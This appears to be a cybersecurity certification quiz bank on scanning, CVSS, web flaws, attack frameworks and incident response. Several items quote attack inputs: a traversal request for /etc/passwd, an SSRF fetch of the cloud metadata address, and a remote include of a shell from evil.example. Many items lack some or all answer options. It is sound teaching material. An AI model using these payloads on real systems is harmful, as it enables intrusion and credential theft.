bank.explain: External scans show the exposed attack surface. Internal scans show what an attacker or insider could exploit after getting in.

bank.q: Which scanning method collects vulnerability data by monitoring network traffic, without sending probes?
bank.explain: Passive scanning infers software and versions from observed traffic. It's safe for fragile systems but less complete.

bank.q: Why is active scanning often avoided or carefully tuned on OT/ICS networks?
options: Probes can crash or disrupt fragile industrial controllers
bank.explain: PLCs and SCADA components can be sensitive to unexpected traffic. Passive monitoring and vendor-approved methods are preferred.

bank.q: A laptop fleet is often off the corporate network. Which approach gives the most consistent vulnerability data?
options: Passive scanning at the data centre
Manual checks by the help desk
bank.explain: Agents run on the endpoint and report when connected, so roaming devices are covered without needing to be on-site during a scan window.

bank.q: Which testing technique sends large volumes of malformed or random input to an application to find crashes?
bank.explain: Fuzzing is dynamic testing that often uncovers memory corruption and input-handling bugs.

bank.q: Comparing servers against a hardening standard such as a CIS Benchmark is an example of what?
bank.explain: Baseline scans check settings against an agreed secure configuration and report the deviations.

bank.q: Which framework requires quarterly internal and external vulnerability scans for organisations that handle cardholder data?
bank.explain: PCI DSS requires regular internal and external (ASV) scans and rescans until passing.

bank.q: Before scanning a production network, which consideration matters most for avoiding business impact?
options: The colour of the scan report
Scheduling and scan intensity, agreed with system owners
The number of monitors in the SOC
bank.explain: Scans can consume bandwidth and stress systems. Agree windows, exclusions and performance limits with the business.

bank.q: Which activity identifies what assets exist on the network before vulnerability scanning begins?
options: Asset discovery (map scans and device fingerprinting)
bank.explain: You can't scan what you don't know about. Discovery and fingerprinting build the asset inventory.

bank.q: Which tool is an intercepting web proxy used to test web applications manually?
bank.explain: Burp Suite (and OWASP ZAP) intercept and modify HTTP requests, letting testers probe web apps.

bank.q: Which tools are general-purpose network vulnerability scanners?
bank.explain: Nessus (commercial) and OpenVAS (open source) scan hosts for known vulnerabilities and misconfigurations.

bank.q: Which tool is best known as a web server scanner that checks for dangerous files, outdated versions and misconfigurations?
bank.explain: Nikto is a command-line web server scanner. It's noisy and easy to detect.

bank.q: A tester wants to confirm a reported vulnerability is really exploitable. Which tool provides exploit modules for this?
bank.explain: Metasploit is an exploitation framework. Validating findings this way needs authorisation and care on production systems.

bank.q: Which tools assess cloud account configurations, for example for publicly exposed storage or overly broad IAM?
bank.explain: Scout Suite and Prowler audit cloud provider configurations against best practices. Pacu is an AWS exploitation framework.

bank.q: Which tool builds visual link graphs of relationships between domains, people, emails and infrastructure for OSINT?
bank.explain: Maltego performs OSINT 'transforms' and displays the relationships graphically.

bank.q: An Nmap scan reports port 3389 'filtered'. What does that mean?
options: The port is closed with a RST response
A firewall or filter is blocking the probes, so Nmap can't tell if it's open
The port is open and RDP is running
bank.explain: Filtered means no response, or an ICMP unreachable reply, prevented Nmap determining the state. Usually a firewall is dropping packets.

bank.q: A scanner reports an Apache vulnerability, but the server runs a distribution package where the fix was backported without changing the version number. What is this finding most likely to be?
bank.explain: Version-based detection can't see backported patches. Verify with the vendor's changelog or a credentialed check.

bank.q: Which tools are debuggers used in reverse engineering?
bank.explain: Debuggers let analysts step through program execution, which is useful for exploit development and malware analysis.

bank.q: In a CVSS v3.1 vector, what does AV:N mean?
bank.explain: AV can be N (network), A (adjacent), L (local) or P (physical). Network is the most severe.

bank.q: What does PR:N in a CVSS vector indicate?
options: No privileges are required to exploit it
bank.explain: Privileges Required: None means an unauthenticated attacker can exploit it, raising severity.

bank.q: What does S:C (Scope: Changed) mean in CVSS?
options: The score has been changed by the vendor
Exploiting the flaw can affect resources beyond the vulnerable component's security scope
bank.explain: For example, a VM escape affecting the hypervisor. Scope Changed raises the score.

bank.q: Two findings: CVSS 9.8 on an isolated lab server with no network access, and CVSS 7.5 on an internet-facing VPN with a public exploit. Which should be fixed first?
options: Neither: wait for the next audit
bank.explain: Context matters: exposure, exploitability and asset value can outweigh the raw CVSS score.

bank.q: A scanner finds no issue on a host that is actually vulnerable. What is this called?
bank.explain: False negatives are dangerous because they give false assurance. Credentialed scans and up-to-date plugins reduce them.

bank.q: Why does 'weaponisation' or a public exploit raise a vulnerability's priority?
options: It lowers the CVSS base score
It means the vendor has patched it
It greatly increases the chance of real attacks
It makes the vulnerability a false positive
bank.explain: Exploit availability, KEV listing or a high EPSS score indicate exploitation is likely or already happening.

bank.q: Which factor is part of CVSS 'impact' metrics?
bank.explain: The base impact metrics are C, I and A, each rated None, Low or High.

bank.q: A vulnerability is being exploited in the wild and no patch exists yet. What is it?
bank.explain: Zero-days have no vendor fix available. Mitigate with compensating controls such as isolation, WAF rules or disabling the feature.

bank.q: Which vulnerability should usually rank higher given equal CVSS scores?
options: One on a server holding customer PII
One on a powered-off spare laptop
One on a test VM scheduled for deletion
One on a kiosk with no network
bank.explain: Asset value and data sensitivity are part of risk-based prioritisation.

bank.q: In CVSS, what does UI:R mean?
options: User Interaction Required, e.g. the victim must open a file or click a link
bank.explain: Needing user interaction lowers the exploitability score compared with UI:N.

bank.q: An analyst manually confirms a scanner finding by checking the installed version and config on the host. What is this step called?
bank.explain: Validation separates true positives from false positives before effort is spent on remediation.

bank.q: Which control best prevents SQL injection?
bank.explain: Parameterised queries keep data separate from code, so input can't change the query structure. Input validation helps as a second layer.

bank.q: A comment field stores a script that runs in every visitor's browser. What type of attack is this?
bank.explain: Stored XSS saves the payload server-side, so it hits everyone who views the page. Output encoding and a content security policy (CSP) mitigate it.

bank.q: A malicious link makes a logged-in user's browser submit a funds transfer to their bank without their knowledge. What is this?
bank.explain: CSRF abuses the browser's automatic sending of cookies. Anti-CSRF tokens and SameSite cookies mitigate it.

bank.q: A request like GET /download?file=../../../../etc/passwd returns the server's password file. What is the flaw?
bank.explain: Mitigate by validating file names against an allow-list and resolving paths within a fixed base directory.

bank.q: An attacker makes a web app fetch http://169.254.169.254/ and read cloud instance credentials. What is this?
bank.explain: SSRF makes the server send requests on the attacker's behalf, often to internal services or metadata endpoints. Mitigate with allow-lists, blocking metadata access and IMDSv2.

bank.q: A user changes the URL from /invoice?id=1001 to /invoice?id=1002 and sees another customer's invoice. Which OWASP category is this?
bank.explain: Insecure direct object references come from missing authorisation checks on each object request.

bank.q: Writing more data into a fixed-size memory area than it can hold, overwriting adjacent memory, is what?
bank.explain: Mitigations include bounds checking, memory-safe languages, ASLR, DEP/NX and stack canaries.

bank.q: A site stores user passwords using unsalted MD5. Which OWASP category does this fall under?
bank.explain: Use a slow, salted password hashing algorithm such as bcrypt, scrypt or Argon2.

bank.q: A web app includes a file named in a URL parameter, and an attacker points it to http://evil.example/shell.txt, which executes. What is this?
bank.explain: RFI loads attacker-controlled remote code. LFI includes files already on the server. Mitigate with allow-lists and by disabling remote includes.

bank.q: A server still runs an operating system that no longer receives security updates. What is the best long-term mitigation?
options: Upgrade or replace it; until then isolate it with compensating controls
Run a vulnerability scan every day
bank.explain: End-of-life components can't be patched. Plan replacement, and meanwhile segment the server and restrict access.

bank.q: An attacker poisons the data used to train a fraud-detection model so fraud is classed as legitimate. What is this?
bank.explain: Protect training data integrity, validate its sources and monitor model behaviour.

bank.q: Default admin credentials left on a newly deployed web console are an example of which category?
bank.explain: Hardening, removing defaults and configuration baselines prevent misconfiguration.

bank.q: A legacy system can't be patched, so the team restricts it to one VLAN and adds IPS rules for the specific exploit. What are these measures?
bank.explain: Compensating controls reduce risk when the primary control (patching) isn't feasible.

bank.q: What should a patching plan include in case a patch breaks a critical application?
bank.explain: Test patches first, deploy in maintenance windows, validate afterwards and be able to roll back.

bank.q: The business decides not to fix a low-risk vulnerability because remediation would cost more than the potential loss, and documents the decision. What is this?
bank.explain: Accepted risks should be formally approved by the risk owner and reviewed periodically, usually through an exception process.

bank.q: Buying cyber insurance to cover breach costs is which risk response?
bank.explain: Transference shifts the financial impact to a third party. The underlying risk still exists.

bank.q: Which practice continuously finds an organisation's internet-facing assets, including forgotten ones?
bank.explain: ASM uses edge and passive discovery to find exposed systems, shadow IT and misconfigurations before attackers do.

bank.q: Which secure coding practice prevents injected script running in the browser when user input is displayed?
bank.explain: Encode output for its context (HTML, JavaScript, URL) so the browser treats input as data.

bank.q: Inviting external researchers to report vulnerabilities in exchange for rewards is called what?
bank.explain: Bug bounties add continuous external testing and need clear scope and safe-harbour rules.

bank.q: What is the purpose of threat modelling during the SDLC?
options: Identifying likely threats and design weaknesses early, when they're cheapest to fix
bank.explain: Methods such as STRIDE help teams design controls before code is written.

bank.q: A policy states that critical vulnerabilities must be fixed within 15 days. What is this an example of?
bank.explain: Defined timeframes by severity drive prioritisation, escalation and compliance reporting.

bank.q: In the Lockheed Martin Cyber Kill Chain, which stage comes immediately after Exploitation?
bank.explain: Reconnaissance, Weaponisation, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives.

bank.q: Blocking a phishing email at the mail gateway disrupts which Kill Chain stage?
bank.explain: Delivery is how the weaponised payload reaches the target, e.g. email, web or USB.

bank.q: What are the four core features of the Diamond Model of Intrusion Analysis?
bank.explain: Each intrusion event links an adversary using a capability over infrastructure against a victim.

bank.q: In MITRE ATT&CK, what does a tactic represent?
options: The adversary's goal at a stage, the 'why', e.g. Persistence
bank.explain: Tactics are goals. Techniques and sub-techniques are how those goals are achieved.

bank.q: A SOC maps its detections to MITRE ATT&CK techniques. What is the main benefit?
options: Seeing coverage gaps against known adversary behaviour
bank.explain: ATT&CK gives a common language, so teams can measure which techniques they detect and prioritise the gaps.

bank.q: Which framework is a peer-reviewed methodology for security testing and analysis that focuses on measurable operational security?
bank.explain: The Open Source Security Testing Methodology Manual defines repeatable, measurable testing.

bank.q: A web application tester wants a structured checklist of test cases for authentication, session management and input validation. Which resource fits best?
bank.explain: The OWASP Testing Guide is a comprehensive methodology for web application security testing.

bank.q: Which MITRE ATT&CK tactic covers an attacker moving from a compromised workstation to other systems?
bank.explain: Lateral Movement techniques include remote services such as RDP or SMB, pass-the-hash and similar.

bank.q: In the Kill Chain, data being stolen or encrypted happens at which stage?
bank.explain: The final stage is the attacker achieving their goal: exfiltration, encryption or destruction.

bank.q: Why is a chain of custody form kept for evidence?
options: To document who handled the evidence, when and why, so it stays admissible
bank.explain: An unbroken chain of custody shows evidence wasn't tampered with, which is critical if legal action follows.

bank.q: After imaging a disk, the analyst computes a SHA-256 hash of the original and the image. Why?
options: To prove the image is an exact, unaltered copy
bank.explain: Matching hashes validate data integrity. They're recorded and re-checked whenever the image is used.

bank.q: Following the order of volatility, which should be collected first from a live compromised host?
bank.explain: RAM (with running processes and network connections) is lost at power-off, so capture it before disk and long-term sources.

bank.q: Legal counsel instructs the team to preserve all email and files related to an incident and suspend normal deletion. What is this?
bank.explain: A legal hold overrides retention and deletion policies for relevant data.

bank.q: Which action best contains a workstation running ransomware while preserving evidence?
options: Restore it from backup straight away without investigation
Isolate it from the network with EDR or by unplugging network, but leave it powered on
Power it off immediately and wipe it
bank.explain: Network isolation stops spread. Keeping power preserves volatile evidence and sometimes encryption keys.

bank.q: What does 'scope' mean during incident analysis?
options: How many systems, accounts and data are affected
bank.explain: Determining scope, often with IoC sweeps across the environment, guides containment so nothing is missed.

bank.q: Why is reimaging generally preferred over 'cleaning' a compromised host?
options: Cleaning is not supported by antivirus
You can't be sure cleaning removed every persistence mechanism
bank.explain: Rebuilding from a known-good image removes hidden persistence. Capture evidence first if it's needed.

bank.q: After a mailbox compromise, the password was reset but the attacker still reads email. What was most likely missed?
options: Revoking sessions/tokens and removing malicious inbox rules or OAuth app grants
bank.explain: Attackers persist through active tokens, forwarding rules and consented apps. Revoke them and review every persistence point.

bank.q: Searching every endpoint for a malicious file hash found on the first infected host is an example of what?
options: An IoC sweep to scope the incident
bank.explain: IoC sweeps find other affected systems, so containment and eradication are complete.

bank.q: Which step belongs to eradication rather than containment?
options: Removing malware and closing the vulnerability that allowed entry
Disconnecting the host from the network
Blocking the C2 IP at the firewall
bank.explain: Containment stops the spread. Eradication removes the threat and its root cause.

bank.q: Before returning restored systems to production, what should be done during recovery?
options: Validate they're clean and patched, and monitor closely for reinfection
Disable the firewall to test connectivity
bank.explain: Recovery includes validation, heightened monitoring and phased restoration.

bank.q: Which source would best show whether data was copied to an external IP during an incident?
options: Firewall/proxy logs and NetFlow for outbound volumes
bank.explain: Outbound connection logs and flow volumes show data transfer to external destinations.

bank.q: A compromised server can't be taken offline because it runs payroll. Which approach fits best?
options: Ignore the compromise until payroll finishes
Apply compensating controls (restrict network access, monitor closely) until it can be rebuilt
bank.explain: Containment options are weighed against business impact. Segmentation and monitoring can limit risk temporarily.

bank.q: What is the purpose of a write blocker when acquiring a disk?
options: Preventing any changes to the original evidence drive
bank.explain: Write blockers allow read-only access, preserving evidence integrity.

bank.q: An EDR shows the same malicious process on 40 hosts. What should drive the containment decision?
options: Scope and impact: which systems are affected and how critical they are
bank.explain: Containment is planned from scope and business impact, e.g. isolating in batches or blocking indicators network-wide.

bank.q: Which document defines roles, communication paths and procedures before an incident happens?
bank.explain: Preparation includes the IR plan, playbooks, tools, training and contact lists.

bank.q: A discussion-based exercise where the team walks through a ransomware scenario without touching systems is called what?
bank.explain: Tabletops test plans, roles and decisions cheaply and expose gaps before a real incident.

bank.q: What is the main goal of a lessons-learned meeting?
options: Improving processes and controls so the incident is less likely, or better handled, next time
bank.explain: Blameless reviews capture what worked, what didn't and the actions to take, with owners and due dates.

bank.q: Root cause analysis after an incident aims to find what?
options: The underlying reason the incident was possible, not just the symptoms
bank.explain: Fixing the root cause, such as an unpatched VPN or missing MFA, prevents recurrence.

bank.q: Which plan focuses on restoring IT systems and data after a disruption?
bank.explain: DR restores technology. Business continuity keeps critical business functions running during the disruption.

bank.q: Why should incident response playbooks be prepared in advance for common scenarios such as phishing or ransomware?
options: They give consistent, fast, step-by-step actions under pressure
They replace the need for analysts
bank.explain: Playbooks reduce decision time and errors during high-stress incidents.

bank.q: What is a jump bag (go bag) in incident response?
options: A prepared kit of tools, media and documentation for responders
bank.explain: It holds write blockers, clean media, cables, forensic tools, contact lists and forms, ready to go.

bank.q: Forensic analysis after containment is mainly used to establish what?
options: What happened, how, when and what was affected
bank.explain: Forensics builds the timeline and evidence for root cause, reporting and possible legal action.

bank.q: Which metric from a business impact analysis defines the maximum tolerable data loss measured in time?
bank.explain: RPO is how much data, as time since the last good copy, can be lost. RTO is how quickly service must be restored.

bank.q: Why is staff training part of incident preparation?
options: People must know their roles and how to report suspicious activity
It is only needed after an incident
It removes the need for playbooks
bank.explain: Trained staff detect and report faster, and responders execute the plan correctly.

bank.q: Which information is most useful in a vulnerability report for system owners who must fix the issues?
options: The analyst's opinion of the vendor
Affected hosts, the vulnerability, risk score and specific mitigation steps
bank.explain: Actionable reports tell owners what's affected, how bad it is and exactly what to do.

bank.q: The same vulnerability keeps reappearing on servers a month after being patched. Which metric highlights this?
bank.explain: Recurrence often points to process problems such as images not being updated or configuration drift.

bank.q: Executives ask whether vulnerability management is improving. Which presentation best answers this?
options: A full list of every CVE found
Trends over time, e.g. open criticals and SLA compliance by month
bank.explain: Leaders need trends and outcomes measured against targets, not raw data.

bank.q: A vendor contract prevents the organisation from patching an appliance itself. What is this an example of?
bank.explain: Contracts, MOUs or SLAs, proprietary systems and support terms can block direct remediation.

bank.q: Patching a manufacturing control system would require halting production for a day. Which inhibitor is this?
bank.explain: Remediation must be balanced against operational impact and is often scheduled into planned downtime.

bank.q: A patch fixes a vulnerability but disables a feature the finance team relies on. Which inhibitor applies?
bank.explain: When a fix breaks needed functionality, consider alternatives such as configuration changes or compensating controls.

bank.q: Which report is designed to show auditors whether systems meet a required standard such as PCI DSS?
bank.explain: Compliance reports map findings to the control requirements of a framework or regulation.

bank.q: Which metric measures how quickly vulnerabilities are fixed against policy targets?
bank.explain: SLA or SLO compliance is a core vulnerability management KPI, often split by severity.

bank.q: Who is usually the right stakeholder to approve accepting the risk of an unpatched critical system?
options: The business or risk owner of the system
bank.explain: Risk acceptance is a business decision made by the accountable owner, not by the security team alone.

bank.q: An action plan to reduce vulnerabilities includes 'update the golden image monthly'. Which category is this?
bank.explain: Fixing images and baselines stops vulnerabilities being redeployed. Action plans also cover patching, compensating controls and training.

bank.q: Why might a 'top 10 vulnerabilities' list be included in a monthly report?
options: It is required by every regulation
It focuses attention and resources on the issues with the most risk
bank.explain: Top-N views help prioritise and communicate where effort will reduce the most risk.

bank.q: A legacy system can't be patched because the vendor no longer exists. Which inhibitor is this?
bank.explain: Unsupported legacy or proprietary systems often need isolation or replacement plans.

bank.q: When reporting a newly disclosed critical zero-day to leadership, what should the report emphasise?
options: Exposure (which assets are affected), the interim mitigations and the decisions needed
bank.explain: Leaders need impact, exposure, what's being done and what they must decide.

bank.q: Which audience needs the most technical detail in a vulnerability report?
bank.explain: Tailor detail to the audience: technical teams need specifics, executives need risk and trends.

bank.q: What belongs in the executive summary of an incident report?
options: Plain-language impact, current status, risk and decisions needed
bank.explain: Executives need the business view first. Technical detail goes in later sections or appendices.

bank.q: Which part of an incident report records events in order, from first malicious activity to recovery?
bank.explain: A clear timeline (with time zones stated) supports root cause analysis and regulatory reporting.

bank.q: During a breach, who should normally approve statements to the media?
options: Public relations together with legal and leadership
bank.explain: Communications go through designated spokespeople to stay accurate and consistent and to manage legal risk.

bank.q: Why involve legal counsel early in a significant incident?
options: To advise on regulatory notification, evidence handling, privilege and liability
bank.explain: Legal guides notification obligations, preservation and communications.

bank.q: An attacker is likely still in the network. Which communication method should the IR team use?
options: Out-of-band channels, separate from the possibly compromised email and chat
bank.explain: If attackers can read internal comms, they can adapt. Use separate, trusted channels.

bank.q: Which metric measures the average time from an incident starting (or being detectable) to it being detected?
bank.explain: Lower MTTD means less dwell time for attackers.

bank.q: Which metric measures the average time from detection to the start of containment actions?
bank.explain: Response time shows how quickly the team acts once an incident is known.

bank.q: A SOC reports a sharp rise in alert volume while the number of confirmed incidents is unchanged. What does this most likely suggest?
options: Detection tuning is needed to reduce false positives
bank.explain: Alert volume against true positives indicates signal quality and analyst workload.

bank.q: Who decides that an event is formally an incident and triggers the IR process?
options: The person or role designated in the IR plan (e.g. incident manager)
bank.explain: Clear incident declaration and escalation criteria avoid delay and confusion.

bank.q: An incident involves criminal extortion. When should law enforcement be contacted?
options: As decided with legal and leadership, following the plan
bank.explain: Involving law enforcement is a planned decision with legal input. It can help, but it affects evidence and communications.

bank.q: Which section of an incident report explains the 'who, what, when, where and why'?
bank.explain: The core narrative should answer these questions clearly before the technical evidence.

bank.q: Why are recommendations included in an incident report?
options: To drive specific improvements that prevent recurrence, with owners and priorities
bank.explain: Actionable recommendations turn lessons learned into tracked improvements.

bank.q: Customers' personal data was exposed. Which communication is most likely required?
options: Notifying affected individuals and regulators as the law requires
bank.explain: Breach notification laws (in Australia, the NDB scheme) set who must be told and when.

bank.q: Which stakeholder group most needs clear, non-technical guidance on what they should do after an incident affecting their accounts?
bank.explain: Communications should tell affected people what happened and what actions to take, such as resetting passwords or watching for scams.

bank.q: What does 'scope' mean in an incident report?
options: The systems, data, users and locations affected
bank.explain: Scope and impact tell stakeholders how far the incident reached and what was affected.
